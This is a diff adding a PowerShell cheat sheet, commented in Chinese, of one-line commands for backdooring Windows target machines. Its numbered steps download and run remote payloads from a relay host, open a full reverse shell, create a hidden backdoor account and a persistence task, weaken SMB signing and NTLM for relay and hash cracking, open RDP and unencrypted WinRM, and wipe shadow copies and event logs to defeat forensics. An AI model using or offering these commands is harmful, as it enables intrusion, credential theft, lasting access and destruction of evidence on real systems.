@@ -1,0 +1,76 @@
+# ===== Windows 开洞 / 后门 一键命令集（irm | iex 系列）=====
+# 用法：在目标机 PowerShell（管理员）里粘贴执行对应一行
+# 说明：irm = Invoke-RestMethod（PS3+），iex = Invoke-Expression
+# 所有载荷放跳板 192.168.2.20:8081（HTTP 明文服务）即可远程加载
+
+# ---------------------------------------------------------------
+# 【0】先决：管理员上下文（若不是管理员，先自提升）
+# ---------------------------------------------------------------
+irm http://192.168.2.20:8081/ps_elevate.ps1 | iex
+
+# ---------------------------------------------------------------
+# 【1】全量开洞（SMB+匿名+关签名+RDP+WinRM+后门账号+共享）
+#      —— 就是 open_attack_surface.ps1 远程版
+# ---------------------------------------------------------------
+irm http://192.168.2.20:8081/open_attack_surface.ps1 | iex
+
+# ---------------------------------------------------------------
+# 【2】最小开洞（只关 SMB 签名 + 放行 445 + 匿名读）
+#      低特征、快、够用
+# ---------------------------------------------------------------
+irm http://192.168.2.20:8081/smb_minimal.ps1 | iex
+
+# ---------------------------------------------------------------
+# 【3】纯后门账号 + 隐藏（不动系统配置，最隐蔽）
+# ---------------------------------------------------------------
+irm http://192.168.2.20:8081/backdoor_user.ps1 | iex
+
+# ---------------------------------------------------------------
+# 【4】反向 shell（PowerShell 单行，跳板 nc 监听 4444）
+# ---------------------------------------------------------------
+powershell -nop -w hidden -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('192.168.2.20',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
+
+# 一句版（更短，irm 拉脚本执行）
+irm http://192.168.2.20:8081/reverse_shell.ps1 | iex
+
+# ---------------------------------------------------------------
+# 【5】SMB 中继配合：关签名 + 开 SMB1（配合 ntlmrelayx）
+# ---------------------------------------------------------------
+powershell -ep bypass -c "Set-SmbServerConfiguration -RequireSecuritySignature \$false -EnableSecuritySignature \$false -Force; dism /online /enable-feature /featurename:SMB1Protocol /all /norestart"
+
+# ---------------------------------------------------------------
+# 【6】NTLMv1 降级（让抓到的哈希可秒破）
+# ---------------------------------------------------------------
+powershell -ep bypass -c "Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa LmCompatibilityLevel 2; Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0 NtlmMinClientSec 0"
+
+# ---------------------------------------------------------------
+# 【7】防火墙全放行（445/139/135/3389/5985/ICMP）
+# ---------------------------------------------------------------
+powershell -ep bypass -c "445,139,135,3389,5985|%{New-NetFirewallRule -DisplayName ('X-TCP-'+$_) -Direction Inbound -Action Allow -Protocol TCP -LocalPort $_ -ErrorAction SilentlyContinue};New-NetFirewallRule -DisplayName X-ICMP -Direction Inbound -Action Allow -Protocol ICMPv4 -ErrorAction SilentlyContinue"
+
+# ---------------------------------------------------------------
+# 【8】开 RDP 并关 NLA（口令直连）
+# ---------------------------------------------------------------
+powershell -ep bypass -c "Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' fDenyTSConnections 0; Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' UserAuthentication 0; Enable-NetFirewallRule -Group 'remote desktop'"
+
+# ---------------------------------------------------------------
+# 【9】开 WinRM（Basic + 不加密，横向利器）
+# ---------------------------------------------------------------
+powershell -ep bypass -c "Set-Service WinRM -StartupType Automatic; Start-Service WinRM; winrm quickconfig -quiet -force; winrm set winrm/config/service/auth '@{Basic=\"true\"}'; winrm set winrm/config/service '@{AllowUnencrypted=\"true\"}'"
+
+# ---------------------------------------------------------------
+# 【10】删卷影副本 + 清日志（反取证，谨慎）
+# ---------------------------------------------------------------
+powershell -ep bypass -c "Get-WmiObject Win32_ShadowCopy|%{$_.Delete()}; wevtutil cl System; wevtutil cl Security; wevtutil cl Application"
+
+# ---------------------------------------------------------------
+# 【11】持久化：计划任务开机反向 shell
+# ---------------------------------------------------------------
+irm http://192.168.2.20:8081/persist_task.ps1 | iex
+
+# ---------------------------------------------------------------
+# 【12】全量回滚
+# ---------------------------------------------------------------
+irm http://192.168.2.20:8081/open_attack_surface.ps1 | iex -Args "-Revert"
+# 或：
+powershell -ep bypass -File open_attack_surface.ps1 -Revert
